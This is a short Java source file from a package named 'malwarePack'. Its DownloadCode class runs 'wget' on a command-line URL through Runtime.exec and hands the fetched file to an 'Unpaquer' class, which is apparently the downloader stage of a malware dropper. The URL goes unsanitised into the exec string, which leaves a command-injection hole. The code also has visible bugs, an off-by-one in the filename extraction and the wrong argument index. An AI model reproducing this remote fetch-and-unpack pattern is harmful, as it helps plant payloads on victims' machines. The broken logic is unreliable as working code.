package malwarePack;

import java.io.IOException;

public class DownloadCode {
		String direccionImagen;
		String direccionInPc;
		public DownloadCode(String url) {
			direccionImagen = url;
			direccionInPc = get(url,url.lastIndexOf("/")+1);
			try {
				Runtime.getRuntime().exec("wget "+direccionImagen).waitFor();
			} catch (IOException e) {
				e.printStackTrace();
			} catch (InterruptedException e) {
				System.out.println("La descarga de la imagen se a detenido");
			}
		}
	
	private String get(String s, int index) {
		String value = "";
		for(int i=index+1;i<s.length();i++) {
			value += Character.toString(s.charAt(i));
		}
		return value;
	}
	public static void main(String args[]) throws IOException {
		DownloadCode code = new DownloadCode(args[1]);
		Unpaquer unpaquer = new Unpaquer(code.direccionInPc);
	}
}
